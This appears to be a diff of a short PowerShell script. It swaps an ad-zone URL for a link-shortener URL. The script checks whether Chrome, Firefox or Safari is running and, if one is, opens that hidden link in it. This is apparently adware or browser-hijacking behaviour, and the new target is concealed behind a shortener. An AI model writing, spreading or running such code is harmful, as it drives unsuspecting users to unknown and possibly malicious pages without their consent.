@@ -1,4 +1,4 @@
-$site="http://deloplen.com/afu.php?zoneid=2364459";
+$site="http://tiny.cc/rtg1az";
 if (get-process "Chrome") { Start $site } 
 elseif (get-process "Firefox") { Start $site } 
 elseif (get-process "Safari") { Start $site } 
